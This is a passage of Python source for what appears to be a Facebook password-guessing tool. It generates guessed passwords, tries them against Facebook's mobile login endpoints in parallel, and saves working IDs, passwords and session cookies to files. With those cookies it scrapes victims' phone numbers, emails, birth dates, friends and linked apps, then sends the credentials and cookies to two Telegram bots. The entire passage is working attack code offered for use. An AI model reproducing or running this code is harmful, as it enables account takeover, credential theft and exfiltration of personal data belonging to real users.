                    SDM.append('aassddff')
                    SDM.append(frs + '123')
                    SDM.append(frs + '1234')
            elif len(frs) < 3:
                SDM.append(nmf)
            else:
                SDM.append(nmf)
                SDM.append(frs + frs)
                SDM.append(frs + ' ' + frs)
                SDM.append('١٢٣٤٥٦')
                SDM.append('١٢٣٤٥٦٧٨٩')
                SDM.append('1122334455@@')
                SDM.append('Aa123456')
                SDM.append('mmmmnnnn')
                SDM.append('nnnnmmmm')
                SDM.append('mmnnbbvv')
                SDM.append('zzzzxxxx')
                SDM.append('zzxxccvv')
                SDM.append('qqwweerr')
                SDM.append('12345@12345')
                SDM.append('123@123')
                SDM.append('1234512345')
                SDM.append('123412345')
                SDM.append('1234554321')
                SDM.append('00998877')
                SDM.append('123456123456')
                SDM.append('1122334455')
                SDM.append('1q2w3e4r5t')
                SDM.append('1q2w3e4r5t6y')
                SDM.append('1020304050')
                SDM.append('20222022')
                SDM.append('aassddff')
                SDM.append(frs + '123')
                SDM.append(frs + '1234')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    SDM.append(xpwd)
            if 'mobile' in method:
                pool.submit(crack, idf, SDM)
            if 'free' in method:
                pool.submit(crackfree, idf, SDM)
            if 'touch' in method:
                pool.submit(cracktouch, idf, SDM)
def crack(idf,SDM):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	rc = random.choice
	amr = rc(['😀', '😃', '😄', '😁', '😆', '😅', '🤣', '😂', '🙂', '🙃', '😉', '😊', '😇', '🥰', '😍', '🤩', '😘', '😗', '😚', '😙','😋', '😛', '😜', '🤪', '😝', '🤑', '🤗', '🤭', '🤫', '🤔', '🤐', '🤨', '😐', '😑', '😶', '😏', '😒', '🙄', '😬','🤥', '😌', '😔', '😪', '🤤', '😴', '😷', '🤒', '🤕', '🤢', '🤮', '🤧', '🥵', '🥶', '🥴', '😵', '🤯', '🤠','🥳', '😎', '🤓', '🧐', '😕', '😟', '🙁', '☹️', '😮', '😯', '😲', '😳', '🥺', '😦', '😧', '😨', '😰', '😥', '😢', '😭','😱', '😖', '😣', '😞', '😓', '😩', '😫', '🥱', '😤', '😡', '😠', '🤬', '😈', '👿', '💀', '☠️', '💩', '🤡', '👹', '👺', '👻', '👽', '👾', '🤖', '😺', '😸', '😹', '😻', '😼', '😽', '🙀', '😿', '😾','🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❤️', '🧡', '💛', '💚', '💙', '💜', '🖤', '🤍', '🤎', '❣️', '💕','💞', '💓', '💗', '💖', '💘', '💝', '💟', '❤️‍🔥', '❤️‍🩹', '❤️','🚀', '🛸', '🌍', '🌎', '🌏','💔','✈️','🦦','🔥','👌🏼','👋🏼','🌚','🔞','🙆‍♂️','🤦‍♂️','✨','🗿','👍🏼','🚬'])
	sys.stdout.write(f"\r{bo}({amr}𖤤نـمࢪود S D M 𖤤) {loop}•{len(id)}  • OK:{ok} •  CP:{cp} • ({'{:.0%}'.format(loop/float(len(id)))}{amr})"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in SDM:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					statuscp = f'''
					▄︻デ══━一 «𝗖𝗣  سڪيوࢪ ࿐» ⏎
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
 (♕) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
 

(♕) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 :{pw}
 
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
(♕) نـمࢪود 𝑆 𝐷 𝑀 𖣬 :『@M_T_F 』⏎
					'''
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='سڪيوࢪ'))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))
					requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(ID2)+"&text="+str(statuscp))
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'''▄︻デ══━一 «𝗢𝗞 شـغال\n ࿐» ⏎
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
\n (𝑆 𝐷 𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆 𝐷 𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆 𝐷 𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
\n(♕) نـمࢪود 𝑆 𝐷 𝑀 𖣬 \n:『@M_T_F 』⏎'\n\n\t\t\t\t\t
					'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='شـغال'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(ID2)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					infoakun += f'''\n▄︻デ══━一 «𝗢𝗞 شـغال\n ࿐» ⏎
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
\n (𝑆 𝐷 𝑀) જ⁀➴  \n- 𝐈𝐃 𖡲 : {idf}\n
 
\n(𝑆 𝐷 𝑀) જ⁀➴  \n- 𝗣𝗔𝗦𝗦 ッ \n :{pw}

\n(𝑆 𝐷 𝑀) જ⁀➴ \n - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ \n:{kuki}
\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
\n(♕) نـمࢪود 𝑆 𝐷 𝑀 𖣬 \n:『@M_T_F 』⏎'''
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(infoakun))

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					statusok = f'''▄︻デ══━一 «𝗢𝗞 شـغال ࿐» ⏎
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
 (𝑆 𝐷 𝑀) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n
 
(𝑆 𝐷 𝑀) જ⁀➴  - 𝗣𝗔𝗦𝗦 ッ  :{pw}

(𝑆 𝐷 𝑀) જ⁀➴  - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 ッ :{kuki}
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
(♕) نـمࢪود 𝑆 𝐷 𝑀 𖣬 :『@M_T_F 』⏎'''
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='شــغال'))
					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
					requests.get("https://api.telegram.org/bot"+str(token2)+"/sendMessage?chat_id="+str(ID2)+"&text="+str(statusok))
					cek_SDMVIP(kuki)
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def cek_SDMVIP(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ☞ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:	 
		print ("\r    %s \033[0mcookie invalid"%(M))
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('/sdcard/ALVINO-DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	try:os.system('clear')
	except:pass
	SDM() 
